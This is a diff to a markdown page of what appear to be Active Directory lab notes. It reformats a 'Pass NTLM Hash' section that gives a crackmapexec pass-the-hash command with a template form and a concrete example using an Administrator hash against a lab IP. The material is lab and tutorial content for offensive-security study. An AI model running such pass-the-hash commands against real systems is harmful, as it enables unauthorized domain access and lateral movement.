@@ -55,16 +55,15 @@ Administrator -> 3b5edb4ae7153d3871522857b2bd1e60
 ```
 
 
-## # Pass NTLM Hash
+##  Pass NTLM Hash
 - After get hash when perform [smb relay attack](https://seczone1.github.io/Active_Directory/2022-07-14-SMB-Relay-Attack) 
 
 - using  crakmapexec Tool 
-```bash
 
+```bash
 crakmapexec DC-IP -u "username" -H ntlm  --local
 
 crakmapexec 192.168.1.2 -u Administrator -H 3b5edb4ae7153d3871522857b2bd1e60 --local
-
 ```
 
 ![Desktop View](/assets/img/AD_Lab/Pasted image 20220823181748.png){: }
